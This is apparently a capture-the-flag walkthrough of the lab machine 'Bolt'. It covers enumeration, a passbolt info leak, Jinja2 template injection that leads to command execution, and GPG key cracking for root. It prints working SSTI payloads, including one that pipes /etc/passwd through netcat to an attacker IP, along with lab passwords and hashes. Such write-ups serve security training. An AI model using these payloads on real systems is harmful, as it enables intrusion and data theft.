# Bolt

![Bolt.png](Bolt/Bolt.png)

### 09/29/2021

Nmap scan to discover open ports in the HOST:

```python
PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Analyzing the versions, the server running nginx are running in old version that can has a vulnerability. 

![Untitled](Bolt/Untitled.png)

Looking at HTTPS port 443 i can retrieve the real host name of the machine and set it into the host file in GNU Linux.

![Untitled](Bolt/Untitled%201.png)

Without host:

![Untitled](Bolt/Untitled%202.png)

With host the return was different:

![Untitled](Bolt/Untitled%203.png)

Ok, now we turn back to the HTTP default page 80 and this is the first contact:

![Untitled](Bolt/Untitled%204.png)

Technologies around the website:

- Web server | Nginx - 1.81.0
- OS | ubuntu
- JavaScript Lib |  jQuery 3.4.1
- Reverse Proxy | Nginx 1.18.0
- UI Framework | Bootstrap 4.4.1

Directory scan at [http://bolt.htb](http://bolt.htb) : 

```python
===============================================================
2021/09/29 16:11:31 Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 26293] x
/download             (Status: 200) [Size: 18570] x
/index                (Status: 308) [Size: 239] [--> http://bolt.htb/]
/index.html           (Status: 200) [Size: 30347] x                    
/login                (Status: 200) [Size: 9287]  x                    
/logout               (Status: 302) [Size: 209] [--> http://bolt.htb/]
/pricing              (Status: 200) [Size: 31731] x                    
/profile              (Status: 500) [Size: 290]   x                    
/register             (Status: 200) [Size: 11038] x                    
/services             (Status: 200) [Size: 22443] x                    
/sign-up              (Status: 200) [Size: 11038] x                    
                                                                      
===============================================================
2021/09/29 16:13:22 Finished
===============================================================
```

![Untitled](Bolt/Untitled%205.png)

In the download page has a download image docker, but this button don't work. 

![Untitled](Bolt/Untitled%206.png)

In both register pages return a error:

![Untitled](Bolt/Untitled%207.png)

HTTPS passbolt:

Inserting the email:

![Untitled](Bolt/Untitled%208.png)

When we set the email it returns a error access requires an invitation.  We can try find some valid email. 

![Untitled](Bolt/Untitled%209.png)

But in burp we can look the response: 

![Untitled](Bolt/Untitled%2010.png)

Searching more about passbolt i found a vulnerability :

![Untitled](Bolt/Untitled%2011.png)

Making the request in verify, it shows a interesting thing that can help us to explore the machine. 

![Untitled](Bolt/Untitled%2012.png)

```python
{"header":
{
"id":"e791ca7a-4865-43e6-bb95-1f6c20ca803c",
"status":"success",
"servertime":1632944754,
"action":"748dcd10-7d15-5498-9aa6-d26de348ff02",
"message":"The operation was successful.",
"url":"\/auth\/verify.json","code":200},
"body":{
"fingerprint":"59860A269E803FA094416753AB8E2EFB56A16C84",
"keydata":"-----BEGIN PGP PUBLIC KEY BLOCK-----\r\nVersion: OpenPGP.js v4.6.2\r\nComment: https:\/\/openpgpjs.org\r\n\r\nxsDNBGA2peUBDADHDueSrCzcZBMgt9GzuI4x57F0Pw922++n\/vQ5rQs0A3Cm\r\nof6BH+H3sJkXIVlvLF4pygGyYndMMQT3NxZ84q32dPp2DKDipD8gA4ep9RAT\r\nIC4seXLUSTgRlxjB\/\/NZNrAv35cHjb8f2hutHGYdigUUjB7SGzkjHtd7Ixbk\r\nLxxRta8tp9nLkqhrPkGCZRhJQPoolQQec2HduK417aBXHRxOLi6Loo2DXPRm\r\nDAqqYIhP9Nkhy27wL1zz57Fi0nyPBWTqA\/WAEbx+ud575cJKHM7riAaLaK0s\r\nhuN12qJ7vEALjWY2CppEr04PLgQ5pj48Asly4mfcpzztP2NdQfZrFHe\/JYwH\r\nI0zLDA4ZH4E\/NK7HhPWovpF5JNK10tI16hTmzkK0mZVs8rINuB1b0uB0u3FP\r\n4oXfBuo6V5HEhZQ\/H+YKyxG8A3xNsMTW4sy+JOw3EnJQT3O4S\/ZR14+42nNt\r\nP+PbpxTgChS0YoLkRmYVikfFZeMgWl2L8MyqbXhvQlKb\/PMAEQEAAc0kUGFz\r\nc2JvbHQgU2VydmVyIEtleSA8YWRtaW5AYm9sdC5odGI+wsElBBMBCgA4FiEE\r\nWYYKJp6AP6CUQWdTq44u+1ahbIQFAmA2peUCGwMFCwkIBwIGFQoJCAsCBBYC\r\nAwECHgECF4AAIQkQq44u+1ahbIQWIQRZhgomnoA\/oJRBZ1Orji77VqFshPZa\r\nDACcb7OIZ5YTrRCeMrB\/QRXwiS8p1SBHWZbzCwVTdryTH+9d2qKuk9cUF90I\r\ngTDNDwgWhcR+NAcHvXVdp3oVs4ppR3+RrGwA0YqVUuRogyKzVvtZKWBgwnJj\r\nULJiBG2OkxXzrY9N\/4hCHJMliI9L4yjf0gOeNqQa9fVPk8C73ctKglu75ufe\r\nxTLxHuQc021HMWmQt+IDanaAY6aEKF0b1L49XuLe3rWpWXmovAc6YuJBkpGg\r\na\/un\/1IAk4Ifw1+fgBoGSQEaucgzSxy8XimUjv9MVNX01P\/C9eU\/149QW5r4\r\naNtabc2S8\/TDDVEzAUzgwLHihQyzetS4+Qw9tbAQJeC6grfKRMSt3LCx1sX4\r\nP0jFHFPVLXAOtOiCUAK572iD2lyJdDsLs1dj4H\/Ix2AV\/UZe\/G0qpN9oo\/I+\r\nvC86HzDdK2bPu5gMHzZDI30vBCZR+S68sZSBefpjWeLWaGdtfdfK0\/hYnDIP\r\neTLXDwBpLFklKpyi2HwnHYwB7YX\/RiWgBffOwM0EYDal5QEMAJJNskp8LuSU\r\n3YocqmdLi9jGBVoSSzLLpeGt5HifVxToToovv1xP5Yl7MfqPdVkqCIbABNnm\r\noIMj7mYpjXfp659FGzzV0Ilr0MwK0sFFllVsH6beaScKIHCQniAjfTqCMuIb\r\n3otbqxakRndrFI1MNHURHMpp9gc2giY8Y8OsjAfkLeTHgQbBs9SqVbQYK0d1\r\njTKfAgYRkjzvp6mbLMaMA3zE9joa+R0XFFZlbcDR1tBPkj9eGK0OM1SMkU\/p\r\nxTx6gyZdVYfV10n41SJMUF\/Nir5tN1fwgbhSoMTSCm6zuowNU70+VlMx4TuZ\r\nRkXI2No3mEFzkw1sg\/U3xH5ZlU\/BioNhizJefn28kmF+801lBDMCsiRpW1i8\r\ncnr5U2D5QUzdj8I1G8xkoC6S6GryOeccJwQkwI9SFtaDQQQLI0b3F6wV32fE\r\n21nq2dek7\/hocGpoxIYwOJRkpkw9tK2g8betT4OjHmVkiPnoyWo9do8g0Bzd\r\nNBUlP7GHXM\/t605MdK9ZMQARAQABwsENBBgBCgAgFiEEWYYKJp6AP6CUQWdT\r\nq44u+1ahbIQFAmA2peUCGwwAIQkQq44u+1ahbIQWIQRZhgomnoA\/oJRBZ1Or\r\nji77VqFshCbkC\/9mKoWGFEGCbgdMX3+yiEKHscumFvmd1BABdc+BLZ8RS2D4\r\ndvShUdw+gf3m0Y9O16oQ\/a2kDQywWDBC9kp3ByuRsphu7WnvVSh5PM0quwCK\r\nHmO+DwPJyw7Ji+ESRRCyPIIZImZrPYyBsJtmVVpjq323yEuWBB1l5NyflL5I\r\nLs9kncyEc7wNb5p1PEsui\/Xv7N5HRocp1ni1w5k66BjKwMGnc48+x1nGPaP0\r\n4LYAjomyQpRLxFucKtx8UTa26bWWe59BSMGjND8cGdi3FiWBPmaSzp4+E1r0\r\nAJ2SHGJEZJXIeyASrWbvXMByxrVGgXBR6NHfl5e9rGDZcwo0R8LbbuACf7\/F\r\nsRIKSwmIaLpmsTgEW9d8FdjM6Enm7nCObJnQOpzzGbHbIMxySaCso\/eZDX3D\r\nR50E9IFLqf+Au+2UTUhlloPnIEcp7xV75txkLm6YUAhMUyLn51pGsQloUZ6L\r\nZ8gbvveCudfCIYF8cZzZbCB3vlVkPOBSl6GwOg9FHAVS0jY=\r\n=FBUR\r\n-----END PGP PUBLIC KEY BLOCK-----"}}
```

To encrypt information both server and client needs the user public keys. 

![Untitled](Bolt/Untitled%2013.png)

```python
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: OpenPGP.js v4.6.2
Comment: https://openpgpjs.org

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
=FBUR

-----END PGP PUBLIC KEY BLOCK-----
```

Decrypting the PGP key:

![Untitled](Bolt/Untitled%2014.png)

```python
rsa3072 2021-02-24 [SC]
      59860A269E803FA094416753AB8E2EFB56A16C84
uid           Passbolt Server Key <admin@bolt.htb>
sub   rsa3072 2021-02-24 [E]
```

Backing to login page we can try fuzz the application with @bolt.htb mail domain.

![Untitled](Bolt/Untitled%2015.png)

```python
clark@bolt.htb
eddie@bolt.htb
```

Interesting vulnerability:

![Untitled](Bolt/Untitled%2016.png)

Scanning to udp ports i found two.

![Untitled](Bolt/Untitled%2017.png)

In the download page has a docker image, download it and analyze the files. 

![Untitled](Bolt/Untitled%2018.png)

![Untitled](Bolt/Untitled%2019.png)

```python
invite_code=XNSS-HSJW-3NGU-8XTJ
'><iframe src="qcarai"></iframe>
```

```python
S#perS3crEt_007
support@bolt.htb
```

![Untitled](Bolt/Untitled%2020.png)

```python
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||

#The hash cracked is "deadbolt"
```

[https://www.passbolt.com/incidents/20190211_multiple_vulnerabilities](https://www.passbolt.com/incidents/20190211_multiple_vulnerabilities)

[https://snyk.io/vuln/composer:passbolt%2Fpassbolt_api](https://snyk.io/vuln/composer:passbolt%2Fpassbolt_api)

[https://www.linode.com/docs/guides/gpg-keys-to-send-encrypted-messages/](https://www.linode.com/docs/guides/gpg-keys-to-send-encrypted-messages/)

Login in the painel. 

![Untitled](Bolt/Untitled%2021.png)

![Untitled](Bolt/Untitled%2022.png)

Chat message:

![Untitled](Bolt/Untitled%2023.png)

![Untitled](Bolt/Untitled%2024.png)

![Untitled](Bolt/Untitled%2025.png)

In the calendar camp i can trigger the iframe:

![Untitled](Bolt/Untitled%2026.png)

```python
9a3bb pyc

SECRET_KEY=
deadbolt
S3cr3t_K#Key
S#perS3crEt_007
support@bolt.htb
XNSS-HSJW-3NGU-8XTJ
clark@bolt.htb
eddie@bolt.htb
sarah@bolt.htb

'DB_USERNAME' , default='appseed
'DB_PASS'     , default='pass'

4109 - routes.py

1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
```

With javascript i can decode the KEY correctly.

![Untitled](Bolt/Untitled%2027.png)

Getting stuck in the machine, we must have to run the reconnaissance again.

![Untitled](Bolt/Untitled%2028.png)

Create account in demo using the key founded in the archive. 

We can login in the email subdomain with the account created in the demo bolt.

![Untitled](Bolt/Untitled%2029.png)

Probably SMTP was not set:

![Untitled](Bolt/Untitled%2030.png)

Submitting name + experience + skills with stti template:

![Untitled](Bolt/Untitled%2031.png)

![Untitled](Bolt/Untitled%2032.png)

And in the name of the profile executes the template injection:

![Untitled](Bolt/Untitled%2033.png)

![Untitled](Bolt/Untitled%2034.png)

```python
dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', 'kreepandcybergeek'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(seconds=43200)), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_U RL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('DEFAULT_MAIL_SENDER', 'support@bolt.htb'), ('MAIL_PASSWORD', None), ('MAIL_PORT', 25), ('MAIL_SERVER', 'localhost'), ('MAIL_USERNAME', None), ('MAIL_USE_SSL', False), ('MAIL_USE_TLS', False), ('SQLALCHEMY_DATABASE_URI', 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'), ('SQLALCHEMY_TRACK_MODIFICATIONS', True), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_RECORD_QUERIES', None), ('SQLALCHEMY_POOL_SIZE', None), ('SQLALCHEMY_POOL_TIMEOUT', None), ('SQLALCHEMY_POOL_RECYCLE', None), ('SQLA LCHEMY_MAX_OVERFLOW', None), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('SQLALCHEMY_ENGINE_OPTIONS', {})])
```

It shows the current configuration object of the flask, all configurations values for the application, it also shows the database credentials. We can call functions of the config object using the template context. 

Injection of all attributes of the os library.: All os variables are UPPERCASE

```python
{{ y }}
```

But in the machine doesn't work. 

Accessing objects inherited classes.

![Untitled](Bolt/Untitled%2035.png)

Now we are the root object, dumping all the classes in the application, now we have a lot of accessible classes. 

![Untitled](Bolt/Untitled%2036.png)

This class is exploitable. 

![Untitled](Bolt/Untitled%2037.png)

The index of popen is 222

Simple payload:

```python
{% if request['application']['globals']['builtins']['import']('os')['popen']('cat /etc/passwd | nc 10.10.14.30 8000')['read']() == 'chiv' %} a {% endif %}
```

Finding index in list:

![Untitled](Bolt/Untitled%2038.png)

```python
import requests
from bs4 import BeautifulSoup
import urllib

res = requests.get("http://0.0.0.0:8000/cls.html")
content = BeautifulSoup(res.text, 'lxml')
code = content.find("h1").text.strip('[]').split(',')

for i in range(0, len(code)):
	if 'subprocess.Popen' in code[i]:
		print(code[i], i)
```

Ok now with the payload we can execute commands.

```python
{{"".__class__.__mro__[1].__subclasses__()[222]('ls',shell=True,stdout=-1).communicate()}}
```

Profile code:

Mysql credentials:

![Untitled](Bolt/Untitled%2039.png)

Connection:

![Untitled](Bolt/Untitled%2040.png)

Users:

![Untitled](Bolt/Untitled%2041.png)

```python
mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube
tdqy62YPNdGEeohXtJ2160bX
kreepandcybergeek
deadbolt
S3cr3t_K#Key
S#perS3crEt_007
rT2;jW7<eY8!dX8}pQ8%
dXUUHSW9vBpH5qRB
WXg5He2wHt4QYHuyGET
```

Remember, in the first enumeration we found the passbolt application, searching a little about passbot, it's a password manager, we can try find some credentials in the folder. 

```python
/etc/passbolt 
```

![Untitled](Bolt/Untitled%2042.png)

We can work with GPG keys:

![Untitled](Bolt/Untitled%2043.png)

We can try crack the key. 

First stepis convert the key to john readable.  But this hashs don't are cracked. Following i read the configuration file and foun the database credentials

```python
'passbolt',
'password' => 'rT2;jW7<eY8!dX8}pQ8%',
passboltdb
```

![Untitled](Bolt/Untitled%2044.png)

Encrypted message GPG:

![Untitled](Bolt/Untitled%2045.png)

Reading GPG table.

![Untitled](Bolt/Untitled%2046.png)

![Untitled](Bolt/Untitled%2047.png)

![Untitled](Bolt/Untitled%2048.png)

Eddie has the same pass of passbolt db.

![Untitled](Bolt/Untitled%2049.png)

User flag:

```python
3fd4808c4574c84ccd97da155f546c2c
```

```python
/etc/ssl/private/passbolt.bolt.htb.key
```

Finding gpg keys in the home fold of eddie.

![Untitled](Bolt/Untitled%2050.png)

In the Extension settings folder has a interesting file with pgp keys.

![Untitled](Bolt/Untitled%2051.png)

![Untitled](Bolt/Untitled%2052.png)

Converting to john crack the hash:

![Untitled](Bolt/Untitled%2053.png)

Cracked HASH

![Untitled](Bolt/Untitled%2054.png)

```python
merrychristmas
```

Let's try crack the message encrypted with this password: At first, import the public and the private keys.

![Untitled](Bolt/Untitled%2055.png)

Now read the message:

![Untitled](Bolt/Untitled%2056.png)

We got the root password:

```python
{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}
```

![Untitled](Bolt/Untitled%2057.png)

Exploration successfully:

![Untitled](Bolt/Untitled%2058.png)

Message:

```python
-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
```

Eddie public key:

```python
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
AAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC
YDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE
30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ
HmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8
wBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD
Cm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM
WZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6
OUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4
U8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox
oBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc
oOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt
vK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1
lXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC
UmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c
tEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE
30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z
5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8
IOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc
PyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC
/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg
pmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1
tD0sGGFpQMsI+Q==
=+pbw
-----END PGP PUBLIC KEY BLOCK-----
```

Some files that i saved in the exploration process: 

![Untitled](Bolt/Untitled%2059.png)
